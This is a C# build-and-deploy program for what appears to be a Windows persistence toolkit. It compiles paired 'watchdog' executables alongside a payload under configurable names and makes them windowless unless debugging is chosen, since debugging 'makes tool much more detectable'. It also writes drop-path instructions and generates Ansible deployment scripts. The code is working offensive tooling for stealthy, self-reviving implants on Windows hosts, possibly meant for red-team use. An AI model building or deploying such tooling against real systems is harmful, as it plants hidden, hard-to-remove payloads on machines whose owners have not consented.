using System.Diagnostics;
using System.Globalization;
using System.Reflection;
using System.Text.RegularExpressions;



public class Deployment
{
    public static bool debugging = false;
    public static void Main(string[] args)
    {
        switchToDeploymentFolder();

        Console.WriteLine("Would you like to deploy with debugging enabled and debugging tools?");
        Console.WriteLine("WARNING: Only use for testing, makes tool much more detectable.");

        Console.WriteLine();
        Console.WriteLine("1. Yes, deploy with debugging.");
        Console.WriteLine("2. No, deploy without debugging.");
        Console.Write("Please enter your choice (1 or 2): ");

        string choice = Console.ReadLine();

        if (choice == "1")
        {
            debugging = true;
        }
        else if (choice == "2")
        {
        }
        else
        {
            Console.WriteLine("Invalid choice, restart the program and try again.");
            Environment.Exit(1);
        }

            string? parentPath = Directory.GetParent(Directory.GetCurrentDirectory())?.FullName; //       \WindowsPersistence\ Folder
            string DeploymentPath = Path.Combine(parentPath, "Deployment", "DeployBins");


            Directory.Delete(DeploymentPath, true); // deletes the old deployment
            Directory.CreateDirectory(DeploymentPath); // Creates new deployment folder

            string relativePath = Path.Combine(Directory.GetCurrentDirectory(), "Configs");
            string fullPath = Path.GetFullPath(relativePath); // \Deployment\Configs\ Folder for the iterator
            if (Directory.Exists(fullPath))
            {  
                int i = 1;
                string primaryWatchDogProjectPath = Path.Combine(parentPath, "PrimaryWatchdog", "PrimaryWatchdog.csproj");
                string secondaryWatchDogProjectPath = Path.Combine(parentPath, "SecondaryWatchdog", "SecondaryWatchdog.csproj");
                string ConfigFilePath = Path.Combine(parentPath, "Config.cs");
                string parentOutputBinsPath = Path.Combine(parentPath, "Deployment", "DeployBins");
                foreach (string dir in Directory.GetDirectories(fullPath, "*", SearchOption.AllDirectories))
                {
                    if (dir.Contains("DeployTemplate"))
                    {
                        continue;
                    }
                    string iteratedConfigPath = Path.Combine(dir, "Config.cs");

                    string secondaryName = GetVarNames(iteratedConfigPath, @"public static string SecondaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");
                    string primaryName = GetVarNames(iteratedConfigPath, @"public static string PrimaryWatchdogName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");
                    string payloadName = GetVarNames(iteratedConfigPath, @"public static string PayloadName\s*{\s*get;\s*private\s*set;\s*}\s*=\s*""([^""]+)(?:\.exe)"";");


                (string fullPath, string lastDirectory) watchdogInfo = GetPrimaryWatchdogPathInfo(iteratedConfigPath);
                    string dirName = "Deployment" + i + "To-" + watchdogInfo.lastDirectory;

                    string iteratedOutputBinsPath = Path.Combine(parentPath, "Deployment", "DeployBins", dirName);

                    ReplaceConfigFile(ConfigFilePath, iteratedConfigPath); // replaces the project's config file with the one for current deploy
                    Directory.CreateDirectory(iteratedOutputBinsPath);

                    string txtFileContent = watchdogInfo.fullPath + "\n\n\n" + "^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^\n\n" + "Payload Name: " + payloadName + ".exe\n" + "Primary Watchdog Name: " + primaryName + ".exe\n" + "Secondary Watchdog Name: " + secondaryName + ".exe";
                        


                    File.WriteAllText(Path.Combine(iteratedOutputBinsPath, "DeployPath.txt"), txtFileContent); //write the primary watchdog path to a .txt


                    SetDebuggingValue(iteratedConfigPath, debugging);
                    Publish(primaryWatchDogProjectPath, iteratedOutputBinsPath, primaryName);
                    Publish(secondaryWatchDogProjectPath, iteratedOutputBinsPath, secondaryName);

                    string[] exeFiles = Directory.GetFiles(dir, "*.exe");
                    string iteratedPayloadPath = exeFiles[0];

                    File.Copy(iteratedPayloadPath, Path.Combine(iteratedOutputBinsPath, payloadName + ".exe"), true);

                    CleanDirectory(iteratedOutputBinsPath, primaryName, secondaryName, payloadName);

                    i++;
                }
            }
            else
            {
                Console.WriteLine("Directory does not exist: " + fullPath);
            }


        GenerateScripts.makeDeployFiles(Path.Combine(parentPath, "Deployment", "WinPersistAnsible"), Path.Combine(parentPath, "Deployment", "DeployBins"), fullPath);
    }



    public static void switchToDeploymentFolder()
    {
        try
        {
            string targetFolderName = "Deployment";

            while (true)
            {
                string currentDirectory = Environment.CurrentDirectory; // Get the current directory
                string folderName = new DirectoryInfo(currentDirectory).Name;

                if (string.Equals(folderName, targetFolderName, StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine($"Found the target folder: {currentDirectory}");
                    break;
                }

                DirectoryInfo parentDirectory = Directory.GetParent(currentDirectory);

                if (parentDirectory == null)
                {
                    Console.WriteLine("Reached the root directory. Target folder not found.");
                    break;
                }

                Environment.CurrentDirectory = parentDirectory.FullName; // Change the current directory to the parent
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }


    public static void Publish(string projectPath, string outputPath, string assemblyName)
    {

        string outputType = debugging ? "Exe" : "WinExe"; //makes all of the window s

        // Build the dotnet publish arguments
        var publishArgs = $"publish \"{projectPath}\" -o \"{outputPath}\" -p:AssemblyName=\"{assemblyName}\" -p:OutputType={outputType}";

        // Debug: Print the arguments to ensure they are correct
        Console.WriteLine($"Publish Arguments: {publishArgs}");

        // Configure the process start info
        var processInfo = new ProcessStartInfo
        {
            FileName = "dotnet",
            Arguments = publishArgs,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        // Start the process
        using (var process = new Process { StartInfo = processInfo })
        {
            try
            {
                process.Start();

                // Read and display output
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();

                process.WaitForExit();

                Console.WriteLine("Output:");
                Console.WriteLine(output);

                if (!string.IsNullOrWhiteSpace(errors))
                {
                    Console.WriteLine("Errors:");
                    Console.WriteLine(errors);
                }

                Console.WriteLine($"Publish process exited with code {process.ExitCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting process: {ex.Message}");
            }
        }
    





        // Start the process
        using (var process = new Process { StartInfo = processInfo })
        {
            try
            {
                process.Start();

                // Read and display output
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();

                process.WaitForExit();

                Console.WriteLine("Output:");
                Console.WriteLine(output);

                if (!string.IsNullOrWhiteSpace(errors))
                {
                    Console.WriteLine("Errors:");
                    Console.WriteLine(errors);
                }

                Console.WriteLine($"Publish process exited with code {process.ExitCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting process: {ex.Message}");
            }
        }
    }




    public static string GetVarNames(String filePath, String regex)
    {
        try
        {
            string fileContent = File.ReadAllText(filePath);
            // Regular expressions to match the SecondaryWatchdogName and PrimaryWatchdogName values
        


            // Extract the values using regex
            var Match = Regex.Match(fileContent, regex);


            if (Match.Success)
            {
                Console.WriteLine("Variable string found for regex: " + Match.Groups[1].Value);
            }
            else
            {
                Console.WriteLine("variable not found for regex.");
            }


            return (Match.Groups[1].Value);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error reading the file: " + ex.Message);
           return (null);
        }
    }

    public static (string fullPath, string lastDirectory) GetPrimaryWatchdogPathInfo(string filePath)
    {
        try
        {
            // Read all text from the file
            string fileContent = File.ReadAllText(filePath);

            // Regex pattern to capture the folder path in PrimaryWatchdogPath
            string primaryPathPattern = @"public static string PrimaryWatchdogPath\s*{\s*get;\s*private\s*set;\s*}\s*=\s*@""([^""]+)"";";

            // Match the PrimaryWatchdogPath and extract the folder name
            var match = Regex.Match(fileContent, primaryPathPattern);

            if (match.Success)
            {
                // Extract the path value
                string primaryPath = match.Groups[1].Value;

                // Get the last folder name
                string lastDirectory = new DirectoryInfo(primaryPath.TrimEnd(Path.DirectorySeparatorChar)).Name;

                return (primaryPath, lastDirectory);
            }
            else
            {
                Console.WriteLine("PrimaryWatchdogPath not found.");
                return (null, null);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error reading the file: " + ex.Message);
            return (null, null);
        }
    }

    public static void ReplaceConfigFile(string oldFilePath, string newFilePath)
    {
        try
        {
            // Check if the old Config.cs file exists
            if (File.Exists(oldFilePath))
            {
                // Delete the old Config.cs file
                File.Delete(oldFilePath);
                Console.WriteLine("Old Config.cs file deleted.");
            }

            // Check if the new Config.cs file exists
            if (File.Exists(newFilePath))
            {
                // Copy the new Config.cs file to the old location
                File.Copy(newFilePath, oldFilePath);
                Console.WriteLine("New Config.cs file copied.");
            }
            else
            {
                Console.WriteLine("New Config.cs file does not exist.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }

    public static void CleanDirectory(string directoryPath, string primaryWatchdogName, string secondaryWatchdogName, string payloadName)
    {
        try
        {
            // Ensure the directory exists
            if (Directory.Exists(directoryPath))
            {
                // Get all files in the directory
                var files = Directory.GetFiles(directoryPath);

                foreach (var file in files)
                {
                    // Get the file name from the path
                    string fileName = Path.GetFileName(file);

                    // Check if the file should be excluded from deletion
                    if (fileName != "DeployPath.txt" &&
                        fileName != primaryWatchdogName + ".exe" &&
                        fileName != secondaryWatchdogName + ".exe" &&
                        fileName != payloadName + ".exe")
                    {
                        // Delete the file
                        File.Delete(file);
                        Console.WriteLine($"Deleted: {file}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"The directory '{directoryPath}' does not exist.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error cleaning directory: {ex.Message}");
        }
    }

    public static void SetDebuggingValue(string filePath, bool debuggingValue)
    {
        try
        {
            // Read the file content
            string fileContent = File.ReadAllText(filePath);

            // Find the line that starts with "public static bool Debugging"
            string searchPattern = "public static bool Debugging";
            int startIndex = fileContent.IndexOf(searchPattern);
            if (startIndex == -1)
            {
                Console.WriteLine("Debugging field not found in the file.");
                return;
            }

            // Find the current value (true or false) and replace it
            int valueStartIndex = fileContent.IndexOf('=', startIndex) + 1;
            int valueEndIndex = fileContent.IndexOf(';', valueStartIndex);
            if (valueStartIndex == -1 || valueEndIndex == -1)
            {
                Console.WriteLine("Debugging value format is incorrect.");
                return;
            }

            // Extract the current value
            string currentValue = fileContent.Substring(valueStartIndex, valueEndIndex - valueStartIndex).Trim();

            // Replace the current value with the new value
            string newValue = debuggingValue.ToString().ToLower(); // Use lowercase for 'true' or 'false'
            fileContent = fileContent.Remove(valueStartIndex, valueEndIndex - valueStartIndex)
                                      .Insert(valueStartIndex, $" {newValue} ");

            // Write the updated content back to the file
            File.WriteAllText(filePath, fileContent);

            Console.WriteLine($"Successfully updated Debugging to {debuggingValue} in {filePath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error modifying the file: {ex.Message}");
        }
    }
}




